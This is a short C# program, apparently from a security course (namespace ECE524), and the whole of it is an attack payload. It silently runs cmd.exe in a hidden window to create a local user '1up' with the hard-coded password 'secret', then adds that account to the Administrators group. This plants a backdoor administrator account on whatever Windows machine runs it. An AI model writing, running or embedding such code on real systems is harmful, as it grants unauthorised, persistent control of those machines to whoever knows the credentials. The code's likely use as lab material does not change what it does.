using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ECE524
{
    class Program
    {
        static void Main(string[] args)
        {
            ProcessStartInfo cmd = new ProcessStartInfo();
            cmd.FileName = "cmd.exe";
            cmd.Arguments = "/C net user /add 1up secret";
            cmd.UseShellExecute = false;
            cmd.CreateNoWindow = true;
            cmd.WindowStyle = ProcessWindowStyle.Hidden;
            var proc = new Process();
            proc.StartInfo = cmd;
            proc.Start();
            proc.WaitForExit();

            cmd.FileName = "cmd.exe";
            cmd.Arguments = "/C net localgroup administrators 1up /add";
            proc.StartInfo = cmd;
            proc.Start();
            proc.WaitForExit();
        }
    }
}
